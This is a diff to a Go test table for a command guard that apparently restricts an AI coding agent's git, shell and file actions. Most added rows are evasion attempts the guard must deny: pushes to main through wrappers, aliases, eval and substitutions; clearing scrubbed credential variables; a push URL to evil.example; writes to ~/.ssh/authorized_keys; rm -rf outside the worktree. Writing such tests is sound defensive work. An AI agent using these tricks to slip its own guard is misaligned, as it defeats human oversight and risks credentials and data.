@@ -3,7 +3,9 @@ package guard
 import (
 	"fmt"
 	"io"
+	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 )
 
@@ -40,7 +42,7 @@ func configCases(policy Policy) []Case {
 
 // Table is every call the gate checks, half of them allowed.
 func Table(policy Policy) []Case {
-	return append(configCases(policy), []Case{
+	table := append(configCases(policy), []Case{
 		// 1. A critical ref is never committed, pushed, merged, deleted, or forced.
 		bash("commit on main", "git commit -m 'feat: thing'", "main", true, "create a branch first"),
 		bash("commit on master", "git commit -m 'feat: thing'", "master", true, "create a branch first"),
@@ -56,19 +58,121 @@ func Table(policy Policy) []Case {
 		bash("push a refspec onto main", "git push origin feat/x:main", "feat/x", true, "open a pull request"),
 		bash("forced refspec onto master", "git push origin +feat/x:master", "feat/x", true, "open a pull request"),
 		bash("gh pr merge", "gh pr merge 12 --squash", "feat/x", true, "merge button"),
+		bash("mirror push reaches every ref", "git push --mirror", "feat/x", true, "reaches every ref"),
+		bash("push --all reaches every ref", "git push --all origin", "feat/x", true, "reaches every ref"),
+		bash("wildcard refspec reaches every ref", "git push origin refs/heads/*:refs/heads/*", "feat/x", true, "wildcard refspec"),
+
+		// 1c. A switch or checkout is judged onto the ref it lands on, tracked across the whole chain.
+		bash("switch onto main", "git switch main", "feat/x", true, "critical ref is watched"),
+		bash("checkout onto master", "git checkout master", "feat/x", true, "critical ref is watched"),
+		bash("a switch then a push reaches main across the chain", "git switch main && git merge --ff-only feat/x && git push", "feat/x", true, "open a pull request"),
+		bash("git -C into another checkout hides the branch", "git -C ../other push origin main", "feat/x", true, "not tracked"),
+
+		// 1d. A global option shifts the subcommand; the guard still finds it.
+		bash("an alias expands to a push on main", "git -c alias.p=push p origin main", "feat/x", true, "open a pull request"),
+		bash("--config-env's value is skipped, not mistaken for the subcommand", "git --config-env foo=bar push origin main", "feat/x", true, "open a pull request"),
+		bash("-c overrides where a bare push lands", "git -c remote.origin.push=main push origin feat/x", "feat/x", true, "config write"),
+		bash("-c overrides the push url", "git -c remote.origin.pushurl=https://evil.example/x push origin feat/x", "feat/x", true, "config write"),
+		bash("git config writes .git/config unchecked", "git config remote.origin.push main", "feat/x", true, "host or toolkit config"),
+
+		// 1b. A wrapper, a chain, or an assignment never hides the real command.
+		bash("push to main through env", "env git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through sudo", "sudo git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through nice", "nice -n 10 git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through timeout", "timeout 30 git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through xargs", "xargs git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main in parens", "(git push origin main)", "feat/x", true, "open a pull request"),
+		bash("push to main in a brace group", "{ git push; }", "main", true, "open a pull request"),
+		bash("push to main after a backgrounded command", "true & git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through sh -c", "sh -c 'git push origin main'", "feat/x", true, "open a pull request"),
+		bash("push to main through bash -c", "bash -c 'git push origin main'", "feat/x", true, "open a pull request"),
+		bash("push to main through a clustered bash -lc", "bash -lc 'git push origin main'", "feat/x", true, "open a pull request"),
+		bash("push to main through bash -c after an option value", "bash -o pipefail -c 'git push origin main'", "feat/x", true, "open a pull request"),
+		bash("push to main through zsh -c", "zsh -c 'git push origin main'", "feat/x", true, "open a pull request"),
+		bash("push to main in a chained subshell", "(cd x && git push origin main)", "feat/x", true, "open a pull request"),
+		bash("a > inside a quoted string is text", `echo "a > /etc/passwd"`, "feat/x", false, ""),
+		bash("a heredoc body is data", "cat <<'EOF'\nx > /etc/passwd\ngit push origin main\nEOF", "feat/x", false, ""),
+		bash("a heredoc a shell reads is commands", "bash <<'EOF'\ngit push origin main\nEOF", "feat/x", true, "open a pull request"),
+		bash("a quoted redirect target is still checked", `echo x > "../outside.txt"`, "feat/x", true, "outside the worktree"),
+		bash("a nested temp path is writable", "echo x > /private/tmp/a/b/c.txt && echo y > /tmp/a/b.txt", "feat/x", false, ""),
+		bash("a relative write after an unresolved cd", "cd $HOME && echo x > notes.txt", "feat/x", true, "cannot resolve"),
+		bash("push to main inside an assigned substitution", "x=$(git push origin main)", "feat/x", true, "open a pull request"),
+		bash("push to main inside a quoted substitution", `echo "$(git push origin main)"`, "feat/x", true, "open a pull request"),
+		bash("push to main inside backticks", "echo `git push origin main`", "feat/x", true, "open a pull request"),
+		bash("a harmless substitution", "echo $(date) `whoami`", "feat/x", false, ""),
+		bash("restore the credential helper through its config pair", "GIT_CONFIG_VALUE_0=osxkeychain git push origin feat/x", "feat/x", true, "scrubs"),
+		bash("restore gh auth through its config dir", "GH_CONFIG_DIR=/Users/x/.config/gh gh api user", "feat/x", true, "scrubs"),
+		bash("export a scrubbed variable", "export GIT_SSH_COMMAND=ssh", "feat/x", true, "scrubs"),
+		bash("unset a scrubbed variable", "unset GIT_SSH_COMMAND", "feat/x", true, "scrubs"),
+		bash("env -u a scrubbed variable", "env -u GIT_SSH_COMMAND git push origin feat/x", "feat/x", true, "scrubs"),
+		bash("git -c hands over a credential helper", "git -c credential.helper=osxkeychain push origin feat/x", "feat/x", true, "credential"),
+		bash("export an ordinary variable", "export FOO=bar", "feat/x", false, ""),
+		bash("--git-dir into another checkout", "git --git-dir=../other/.git push origin HEAD", "feat/x", true, "not tracked"),
+		bash("GIT_DIR into another checkout", "GIT_DIR=../other/.git git push origin HEAD", "feat/x", true, "scrubs"),
+		bash("--git-dir only reading", "git --git-dir=../other/.git log --oneline", "feat/x", false, ""),
+		bash("a bare cd goes home", "cd && rm -rf Library/Keychains", "feat/x", true, "outside the worktree"),
+		bash("cd -- to another directory", "cd -- /Users/x && rm -rf y", "feat/x", true, "outside the worktree"),
+		bash("pushd leaves the directory unknown", "pushd /Users/x && rm -rf y", "feat/x", true, "cannot resolve"),
+		bash("env -i clears the scrub", "env -i HOME=/Users/x PATH=/usr/bin git push origin feat/x", "feat/x", true, "clears"),
+		bash("env - clears the scrub", "env - git push origin feat/x", "feat/x", true, "clears"),
+		bash("env with a glued -u", "env -uGIT_CONFIG_COUNT git push origin feat/x", "feat/x", true, "scrubs"),
+		bash("env --unset", "env --unset GIT_CONFIG_COUNT git push origin main", "feat/x", true, "scrubs"),
+		bash("readonly resets the scrub", "readonly GIT_CONFIG_COUNT=0", "feat/x", true, "scrubs"),
+		bash("let resets the scrub", "let GIT_CONFIG_COUNT=0", "feat/x", true, "scrubs"),
+		bash("printf -v resets the scrub", "printf -v GIT_CONFIG_COUNT 0", "feat/x", true, "scrubs"),
+		bash("read resets the scrub", "read GIT_CONFIG_COUNT", "feat/x", true, "scrubs"),
+		bash("git -c include.path re-reads a global config", "git -c include.path=/Users/x/.gitconfig push origin feat/x", "feat/x", true, "credential"),
+		bash("a substitution inside an unquoted heredoc", "cat <<EOF\n$(git push origin HEAD:main)\nEOF", "feat/x", true, "open a pull request"),
+		bash("an apostrophe inside double quotes", `echo "don't" $(git push origin HEAD:main)`, "feat/x", true, "open a pull request"),
+		bash("a single-quoted substitution is text", `git commit -m "don't" && echo '$(rm ../x)'`, "feat/x", false, ""),
+		bash("process substitution", "cat <(git push origin HEAD:main)", "feat/x", true, "open a pull request"),
+		bash("cd with clustered options", "cd -Pe /Users/x && rm -rf y", "feat/x", true, "outside the worktree"),
+		bash("cd with two operands", "cd a b && rm -rf y", "feat/x", true, "cannot resolve"),
+		bash("a push inside if and then", "if true; then git push origin HEAD:main; fi", "feat/x", true, "open a pull request"),
+		bash("a push after !", "! git push origin main", "feat/x", true, "open a pull request"),
+		bash("eval of several words", "eval git push origin HEAD:main", "feat/x", true, "open a pull request"),
+		bash("an ordinary if", "if go test ./...; then echo ok; fi", "feat/x", false, ""),
+		bash("export an ordinary path", "export PATH=/usr/local/bin:/usr/bin", "feat/x", false, ""),
+		bash("cd into a subdirectory to test", "cd internal/guard && go test ./...", "feat/x", false, ""),
+		bash("printf -v an ordinary variable", "printf -v out '%s' hi", "feat/x", false, ""),
+		bash("env -u an ordinary variable", "env -u FOO go test ./...", "feat/x", false, ""),
+		bash("let an ordinary counter", "let count=1", "feat/x", false, ""),
+		bash("source a file that holds no commands the guard refuses", "source .venv/bin/activate", "feat/x", false, ""),
+		bash("push to main through a git shell alias", "git -c alias.p='!git push origin main' p", "feat/x", true, "a shell alias hides its command"),
+		bash("switch back to an untracked previous branch", "git switch - && git push", "feat/x", true, "the previous branch is not tracked"),
+		bash("checkout an earlier branch by reflog", "git checkout @{-1}", "feat/x", true, "the previous branch is not tracked"),
+		bash("a plain git alias still runs", "git -c alias.st=status st", "feat/x", false, ""),
+		bash("push to main through eval", "eval 'git push origin main'", "feat/x", true, "open a pull request"),
+		bash("an assignment overrides the credential scrub", "GIT_ASKPASS=/tmp/evil git status", "feat/x", true, "scrub"),
+		bash("push to main through sudo with a flag value", "sudo -u root git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through env with a flag value", "env -u HOME git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through timeout with a flag value", "timeout -s KILL 5 git push origin main", "feat/x", true, "open a pull request"),
+		bash("env's own assignment overrides the credential scrub", "env GIT_ASKPASS=x git status", "feat/x", true, "scrub"),
+		bash("push to main through command", "command git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through exec", "exec git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through nohup", "nohup git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through time", "time git push origin main", "feat/x", true, "open a pull request"),
+		bash("push to main through stdbuf with a glued flag", "stdbuf -o0 git push origin main", "feat/x", true, "open a pull request"),
 
 		// 2. A write never leaves the worktree root.
 		write("edit above the root", "../outside/file.go", true, "outside the worktree"),
 		write("write an absolute path elsewhere", "/etc/hosts", true, "outside the worktree"),
 		bash("rm above the root", "rm ../sibling/file", "feat/x", true, "outside the worktree"),
-		bash("mv out of the tree", "mv a.go /tmp/elsewhere.go", "feat/x", true, "outside the worktree"),
+		bash("mv out of the tree", "mv a.go /etc/elsewhere.go", "feat/x", true, "outside the worktree"),
 		bash("redirect above the root", "echo x > ../outside.txt", "feat/x", true, "outside the worktree"),
 		bash("tee above the root", "cat a | tee ../outside.txt", "feat/x", true, "outside the worktree"),
 
+		// 2b. dd, sed, perl, find, and >| write paths too.
+		bash("dd of= parses the assignment", "dd if=/dev/zero of=.git/config", "feat/x", true, "host or toolkit config"),
+		bash("sed -i above the root", "sed -i 's/a/b/' ../outside.txt", "feat/x", true, "outside the worktree"),
+		bash("perl -i above the root", "perl -i -pe 's/a/b/' ../outside.txt", "feat/x", true, "outside the worktree"),
+		bash("find -delete above the root", "find ../sibling -delete", "feat/x", true, "outside the worktree"),
+		bash("noclobber override above the root", "echo x >| ../outside.txt", "feat/x", true, "outside the worktree"),
+
 		// A commit message never carries a trailer. The config rows come from the policy itself.
 		bash("co-author trailer", "git commit -m 'feat: x\n\nCo-authored-by: A <a@b.c>'", "feat/x", true, "trailer"),
-		bash("generated-with trailer", "git commit -m 'feat: x\n\nGenerated with a tool'", "feat/x", true, "trailer"),
-		bash("generated-by trailer", "git commit -m 'feat: x\n\nGenerated by a tool'", "feat/x", true, "trailer"),
+		bash("generated-with trailer", "git commit -m 'feat: x\n\nGenerated-with: a tool'", "feat/x", true, "trailer"),
+		bash("generated-by trailer", "git commit -m 'feat: x\n\nGenerated-by: a tool'", "feat/x", true, "trailer"),
 		bash("robot trailer", "git commit -m 'feat: x\n\n\U0001F916 made this'", "feat/x", true, "trailer"),
 		bash("robot label beside a commit", "git commit -m 'feat: x' && gh pr edit 1 --add-label '@agent \U0001F916'", "feat/x", false, ""),
 
@@ -87,6 +191,14 @@ func Table(policy Policy) []Case {
 		bash("delete its own remote branch", "git push origin --delete feat/old", "feat/x", false, ""),
 		bash("rebase onto main", "git rebase main", "feat/x", false, ""),
 		bash("switch to a new branch", "git switch -c feat/y", "feat/x", false, ""),
+		bash("switch then push its own branch", "git switch feat/y && git push origin feat/y", "feat/x", false, ""),
+		bash("push its own branch by name", "git push origin feat/x", "feat/x", false, ""),
+		bash("-C into the same directory", "git -C . status", "feat/x", false, ""),
+		bash("-C reads another checkout's status", "git -C ../other status --short", "feat/x", false, ""),
+		bash("-C lists another checkout's branch", "git -C ../other branch --show-current", "feat/x", false, ""),
+		bash("-C commits in another checkout", "git -C ../other commit -m 'fix: x'", "feat/x", true, "not tracked"),
+		bash("-C moves a branch in another checkout", "git -C ../other branch -f main HEAD", "feat/x", true, "not tracked"),
+		bash("read a config value", "git config --get user.name", "feat/x", false, ""),
 		bash("amend its own commit", "git commit --amend -m 'feat: thing'", "feat/x", false, ""),
 		bash("stash", "git stash push -u -m wip", "feat/x", false, ""),
 		bash("tag a release", "git tag -a v2.0.0 -m 'release 2.0.0'", "feat/x", false, ""),
@@ -103,10 +215,58 @@ func Table(policy Policy) []Case {
 		bash("read a pull request", "gh pr view 12", "feat/x", false, ""),
 		bash("commit with a body and no trailer", "git commit -m 'feat: x\n\nWhat it does.'", "feat/x", false, ""),
 		bash("sudo is not one of the four denials", "sudo make install", "feat/x", false, ""),
+		bash("sudo with a flag value runs a harmless command", "sudo -u root ls", "feat/x", false, ""),
+		bash("time runs a harmless command", "time go test ./...", "feat/x", false, ""),
+		bash("nice runs a harmless command", "nice -n 10 go test ./...", "feat/x", false, ""),
+		bash("a background job that touches nothing critical", "sleep 1 & echo done", "feat/x", false, ""),
 		write("a new source file", "internal/line/new.go", false, ""),
 		write("a file in the state directory", ".komodo/results/TSK-01.1.1.json", false, ""),
 		write("the repo's own rules", "AGENTS.md", false, ""),
 	}...)
+	table = append(table, foldedCaseCases()...)
+	table = append(table, extraCases()...)
+	return table
+}
+
+// extraCases is every bypass and false-deny row added past the original table, kept separate
+// so the sections above stay in their own history.
+func extraCases() []Case {
+	return []Case{
+		// 3. A write target the guard cannot resolve, or a cd that leaves the root, is caught too.
+		write("an unresolved variable escapes the path check", "$HOME/.ssh/authorized_keys", true, "unresolved variable"),
+		write("another user's home escapes the path check", "~otheruser/.ssh/authorized_keys", true, "unresolved variable"),
+		bash("an unresolved variable in a redirect", "echo x > $HOME/.bashrc", "feat/x", true, "unresolved variable"),
+		bash("a writer follows a cd out of the root", "cd .. && touch sibling.txt", "feat/x", true, "outside the worktree"),
+
+		// 4. A null device or a system temp directory costs nothing to write to.
+		bash("stderr to the null device", "grep x a.go 2>"+os.DevNull, "feat/x", false, ""),
+		bash("stdout to the null device", "make build >"+os.DevNull, "feat/x", false, ""),
+		bash("write into /tmp", "touch /tmp/probe.txt", "feat/x", false, ""),
+		bash("write into /private/tmp", "touch /private/tmp/probe.txt", "feat/x", false, ""),
+		bash("write into the system temp directory", "touch "+filepath.Join(os.TempDir(), "probe.txt"), "feat/x", false, ""),
+
+		// 4b. cp, mv, ln, and install read every argument but the last; only the last is checked.
+		bash("cp reads a source outside the root", "cp /etc/hosts internal/line/copy.go", "feat/x", false, ""),
+		bash("cp still checked writing outside the root", "cp internal/line/a.go /etc/hosts", "feat/x", true, "outside the worktree"),
+
+		// 5. A trailer is caught inside a quoted message, through -F, and through --trailer.
+		bash("trailer after a semicolon inside -m", `git commit -m 'feat: x; Co-authored-by: A <a@b.c>'`, "feat/x", true, "trailer"),
+		bash("trailer after && inside -m", `git commit -m 'feat: x && Co-authored-by: A <a@b.c>'`, "feat/x", true, "trailer"),
+		bash("trailer via --trailer", "git commit -m 'feat: x' --trailer 'Co-authored-by=A <a@b.c>'", "feat/x", true, "trailer"),
+		bash("prose about generated code carries no trailer", "git commit -m 'feat: x\n\nThe files generated by stringer are not tracked.'", "feat/x", false, ""),
+	}
+}
+
+// foldedCaseCases builds the config-path rows that only a case-insensitive disk mismatches,
+// so the table only runs them on darwin and windows.
+func foldedCaseCases() []Case {
+	if runtime.GOOS != "darwin" && runtime.GOOS != "windows" {
+		return nil
+	}
+	return []Case{
+		write("a case-folded bin path on a case-insensitive disk", "Bin/komodo-darwin-arm64", true, "host or toolkit config"),
+		bash("a case-folded git hooks path on a case-insensitive disk", "touch .GIT/hooks/pre-commit", "feat/x", true, "host or toolkit config"),
+	}
 }
 
 // RunTable checks every row and returns the rows whose outcome was wrong.
